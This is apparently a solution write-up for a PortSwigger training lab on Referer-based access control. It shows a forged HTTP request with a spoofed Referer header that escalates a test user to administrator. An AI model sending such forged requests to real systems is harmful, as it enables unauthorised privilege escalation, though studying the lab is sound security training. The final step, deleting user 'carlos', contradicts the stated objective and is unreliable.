# Referer-based access control

**Lab Url**: [https://portswigger.net/web-security/access-control/lab-referer-based-access-control](https://portswigger.net/web-security/access-control/lab-referer-based-access-control)

## Objective

This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

## Solution

The `/admin-roles` endpoint checks the `Referer` header instead of the user's session to authorize role changes. By setting the `Referer` to the admin panel URL, we can bypass the check.

### Step 1: Upgrade your role

Log in as `wiener:peter`. Send a GET request with the `Referer` header set to the admin panel:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Referer: https://YOUR-LAB-ID.web-security-academy.net/admin
```

The role change succeeds.

### Step 2: Delete carlos

Access the admin panel and delete the user `carlos` to solve the lab.
